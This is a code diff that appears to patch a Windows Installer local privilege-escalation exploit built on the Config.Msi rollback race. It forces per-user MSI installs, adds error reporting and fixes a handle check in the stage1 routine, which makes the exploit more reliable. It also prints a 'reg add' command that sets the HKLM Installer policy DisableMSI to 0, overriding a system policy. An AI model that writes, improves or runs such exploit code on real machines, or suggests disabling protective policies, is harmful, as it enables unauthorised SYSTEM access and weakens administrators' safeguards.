@@ -185,26 +185,44 @@ void spinUntilConfigMsiDeleted()
 void install(const std::wstring& installPath) {
 	TempMsi tempMsi;
 	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
-	MsiInstallProduct(
+	UINT ret = MsiInstallProduct(
 		tempMsi.GetTempMsiPath().c_str(),
-		(L"ACTION=INSTALL TARGETDIR=" + installPath).c_str());
+		(L"ACTION=INSTALL ALLUSERS=\"\" TARGETDIR=" + installPath).c_str());
+	if (ret != ERROR_SUCCESS)
+	{
+		std::wcout << L"[-] install() MsiInstallProduct failed: " << ret << std::endl;
+		if (ret == ERROR_INSTALL_PACKAGE_REJECTED)
+		{
+			std::wcout << L"[-] Per-user MSI installs are disabled by system policy." << std::endl;
+			std::wcout << L"[-] Fix: reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\" /v DisableMSI /t REG_DWORD /d 0 /f" << std::endl;
+		}
+	}
 }
 
 void installWithRollback(const std::wstring& installPath) {
 	CreateDirectory(installPath.c_str(), NULL);
 	TempMsi tempMsi;
 	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
-	MsiInstallProduct(
+	UINT ret = MsiInstallProduct(
 		tempMsi.GetTempMsiPath().c_str(),
-		(L"ACTION=INSTALL ERROROUT=1 TARGETDIR=" + installPath).c_str());
+		(L"ACTION=INSTALL ALLUSERS=\"\" ERROROUT=1 TARGETDIR=" + installPath).c_str());
+	if (ret != ERROR_SUCCESS)
+		std::wcout << L"[-] installWithRollback() MsiInstallProduct failed: " << ret << std::endl;
 }
 
 void uninstall() {
 	TempMsi tempMsi;
 	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
-	MsiInstallProduct(
+	UINT ret = MsiInstallProduct(
 		tempMsi.GetTempMsiPath().c_str(),
-		L"REMOVE=ALL");
+		L"REMOVE=ALL ALLUSERS=\"\"");
+	if (ret != ERROR_SUCCESS)
+	{
+		if (ret == ERROR_UNKNOWN_PRODUCT)
+			std::wcout << L"[i] uninstall() MsiInstallProduct: product not currently installed, skipping cleanup." << std::endl;
+		else
+			std::wcout << L"[-] uninstall() MsiInstallProduct failed: " << ret << std::endl;
+	}
 }
 
 DWORD WINAPI thread_uninstall(PVOID)
@@ -244,7 +262,7 @@ void stage1()
 		dummyFilePath.c_str(),
 		FILE_READ_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING,
 		0, NULL);
-	if (!hFileDummy)
+	if (hFileDummy == INVALID_HANDLE_VALUE)
 	{
 		std::wcout << L"[-] " << std::wstring(dummyFilePath) << L" didn't install, exiting" << std::endl;
 		exit(1);
